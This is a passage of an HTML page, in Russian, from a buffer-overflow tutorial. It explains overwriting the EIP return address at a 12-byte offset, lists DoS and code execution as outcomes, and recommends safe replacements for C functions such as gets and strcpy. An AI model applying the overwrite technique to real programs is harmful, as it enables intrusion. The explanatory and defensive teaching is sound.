+color:#454545'>»</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>а затем четыре символа</span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>которые на самом деле являются адресом инструкции</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>которую мы хотим выполнить</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Почему двенадцать</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>?</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>   8 // size of buf
+(char buf[8])</span></p>
+
+<p class=a0 style='line-height:150%'><span style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>+  4 // four additional
+bytes for overwriting stack frame pointer</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>----</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>  12</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Анализ
+проблемы</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>:</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Проблема та
+же, </span><span lang=RU style='font-size:12.0pt;line-height:150%;font-family:
+"Times New Roman",serif;color:#454545'>что и в первом примере</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Нет контроля над
+размером копируемого буфера в объявленный ранее</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;В этом примере мы
+перезаписываем регистр </span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>EIP </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>адресом </span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>0x080483f9, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>который на самом деле является вызовом </span><span lang=DA
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>ret </span><span lang=RU style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>на последней фазе
+выполнения программы</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Как по-</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>другому использовать ошибки переполнения буфера</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>?</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Как
+правило, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>использование этих ошибок
+может привести к</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>:</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=RU style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>приложение </span><span
+lang=IT style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>DoS</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=RU style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>изменение порядка выполнения
+функций</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=RU style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>выполнение кода </span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>(</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>если мы сможем внедрить
+шеллкод</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>описанный в отдельном документе</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>)</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Как
+возникают ошибки переполнения буфера</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>?</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Такого рода
+ошибки очень легко сделать</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>.</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>&nbsp;В течение многих лет они были кошмаром программиста</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Проблема заключается в
+собственных функциях </span><span lang=ES-TRAD style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>C, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>которые не заботятся о соответствующих проверках длины буфера</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Ниже приведен список
+таких функций и</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>если они существуют</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>их безопасные эквиваленты</span><span lang=FR style='font-size:
+12.0pt;line-height:150%;font-family:"Times New Roman",serif;color:#454545'>:</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>gets() -\&gt; fgets()- </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>читать символы</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>strcpy() -\&gt; strncpy()- </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>скопировать содержимое буфера</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>strcat() -\&gt; strncat()-
+объединение буферов</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>sprintf() -\&gt; snprintf()-
+</span><span lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>заполнить буфер данными разных типов</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>(f)scanf()- </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>читать из </span><span style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>STDIN</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>getwd()- вернуть рабочий
+каталог</span></p>
+
+<p class=a0 style='margin-left:33.6pt;text-indent:-33.6pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;font-family:Menlo;color:#454545'>•<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>realpath()- </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>вернуть абсолютный </span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>(</span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>полный</span><span lang=FR style='font-size:12.0pt;line-height:
+150%;font-family:"Times New Roman",serif;color:#454545'>) </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>путь</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Используйте
+безопасные эквивалентные функции</span><span lang=FR style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>, </span><span
+lang=RU style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>которые проверяют длину буферов</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>когда это возможно</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;А именно</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>:</span></p>
+
+<p class=a0 style='margin-left:28.0pt;text-indent:-28.0pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;color:#454545'>1.<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>gets() -\&gt; fgets()</span></p>
+
+<p class=a0 style='margin-left:28.0pt;text-indent:-28.0pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;color:#454545'>2.<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>strcpy() -\&gt; strncpy()</span></p>
+
+<p class=a0 style='margin-left:28.0pt;text-indent:-28.0pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;color:#454545'>3.<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>strcat() -\&gt; strncat()</span></p>
+
+<p class=a0 style='margin-left:28.0pt;text-indent:-28.0pt;line-height:150%'><span
+lang=FR style='font-size:10.0pt;line-height:150%;color:#454545'>4.<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>sprintf() -\&gt; snprintf()</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Те функции</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>которые не имеют безопасных
+эквивалентов</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>должны быть переписаны с реализованными безопасными проверками</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Время</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>потраченное на это</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>принесет пользу в будущем</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>&nbsp;Помните</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>что вы должны сделать это
+только один раз</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>.</span></p>
+
+<p class=a0 style='line-height:150%'><span lang=RU style='font-size:12.0pt;
+line-height:150%;font-family:"Times New Roman",serif;color:#454545'>Используйте
+компиляторы</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>которые умеют выявлять небезопасные функции</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>логические ошибки и
+проверять</span><span lang=FR style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>, </span><span lang=RU
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>не перезаписывается ли память там</span><span lang=FR
+style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>, </span><span lang=RU style='font-size:12.0pt;line-height:150%;
+font-family:"Times New Roman",serif;color:#454545'>где этого быть не должно</span><span
+lang=FR style='font-size:12.0pt;line-height:150%;font-family:"Times New Roman",serif;
+color:#454545'>.</span></p>
+
+</div>
+
+</body>
+
+</html>
